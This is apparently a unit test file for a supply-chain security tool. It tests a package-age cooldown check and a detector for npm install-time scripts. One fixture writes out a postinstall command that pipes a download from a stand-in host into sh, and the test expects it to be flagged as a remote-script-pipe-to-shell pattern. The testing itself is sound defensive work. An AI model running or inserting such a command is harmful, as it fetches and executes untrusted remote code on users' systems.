import assert from "node:assert/strict";
import { describe, it } from "node:test";

import { calculateCooldown } from "../../src/detector/cooldown-checker.ts";
import { detectLifecycleScripts } from "../../src/detector/lifescycle-script-detector.ts";

describe("calculateCooldown", () => {
    it("marks a recently published version as inside cooldown", () => {
        const result = calculateCooldown(
            "2026-06-20T00:00:00.000Z",
            7,
            new Date("2026-06-21T00:00:00.000Z")
        );

        assert.equal(result.isInCooldown, true);
        assert.equal(result.ageDays, 1);
    });

    it("marks an old version as outside cooldown", () => {
        const result = calculateCooldown(
            "2026-06-01T00:00:00.000Z",
            7,
            new Date("2026-06-21T00:00:00.000Z")
        );

        assert.equal(result.isInCooldown, false);
        assert.equal(result.ageDays, 20);
    });
});

describe("detectLifecycleScripts", () => {
    it("checks preinstall, install, and postinstall scripts", () => {
        const result = detectLifecycleScripts({
            preinstall: "node preflight.js",
            install: "node-gyp rebuild",
            postinstall:
                "curl https://example.test/payload | sh",
            test: "node --test",
        });

        assert.equal(result.preinstall.exists, true);
        assert.equal(result.install.exists, true);
        assert.equal(result.postinstall.exists, true);
        assert.equal(result.postinstall.suspicious, true);
        assert.deepEqual(
            result.postinstall.matchedPatterns,
            ["remote-script-pipe-to-shell"]
        );
    });

    it("handles packages without scripts", () => {
        const result = detectLifecycleScripts(undefined);

        assert.equal(result.preinstall.exists, false);
        assert.equal(result.install.exists, false);
        assert.equal(result.postinstall.exists, false);
    });
});
